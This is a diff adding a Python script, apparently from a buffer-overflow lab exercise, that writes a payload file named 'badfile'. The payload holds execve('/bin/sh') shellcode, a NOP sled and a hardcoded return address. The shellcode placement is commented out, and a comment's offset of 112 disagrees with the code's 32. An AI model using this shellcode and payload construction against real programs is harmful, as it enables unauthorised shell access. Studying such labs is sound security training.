@@ -1,0 +1,54 @@
+#!/usr/bin/python3
+import sys 
+ 
+shellcode= ( 
+
+"\x31\xc0" 
+"\x50"  
+"\x68""//sh" 
+"\x68""/bin" 
+"\x89\xe3" 
+"\x50" 
+"\x53" 
+"\x89\xe1" 
+"\x99" 
+"\xb0\x0b" 
+"\xcd\x80" 
+).encode('latin-1') 
+
+function = (
+    "\x31\xC0\x40\x50"
+).encode('latin-1')
+
+# inject_fn = function + shellcode
+ 
+total_ln = 300
+
+# ebp+4-buffer
+dist = 32
+NOPs = 0x00
+ebp_8 = 0x5655626d
+ 
+L = 4
+ 
+# Fill the content with NOPs 
+content = bytearray(0x90 for i in range(total_ln)) 
+print(len(shellcode))
+print(len(function))
+# print(len(inject_fn))
+
+
+# Put the shellcode at the end 
+# shell_end = total_ln
+# start = shell_end - len(inject_fn) 
+# content[start:start+len(inject_fn)] = inject_fn 
+
+
+# Put the address at offset 112 
+jmp_addr = ebp_8 + NOPs
+content[dist:dist+L] = (jmp_addr).to_bytes(4,byteorder='little') 
+ 
+# Write the content to a file 
+with open('badfile', 'wb') as f: 
+    f.write(content) 
+
